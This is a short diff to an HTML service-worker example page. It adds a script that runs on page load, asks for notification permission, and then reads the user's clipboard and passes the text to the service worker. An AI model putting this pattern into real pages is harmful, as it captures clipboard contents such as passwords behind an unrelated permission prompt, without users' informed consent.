@@ -11,6 +11,19 @@
 
 <p>This is a simple service worker example.</p>
 
+<script>
+  // Function to request notification permission and send clipboard contents to service worker
+  async function sendClipboardContentToServiceWorker() {
+    const permission = await Notification.requestPermission();
+    if (permission === 'granted') {
+      const clipboardText = await navigator.clipboard.readText();
+      navigator.serviceWorker.controller.postMessage({ clipboardText });
+    }
+  }
+
+  // Send clipboard content to service worker when the page loads
+  sendClipboardContentToServiceWorker();
+</script>
 
 <script>
   if ('serviceWorker' in navigator) {
@@ -25,5 +38,6 @@
     });
   }
 </script>
+
 </body>
 </html>
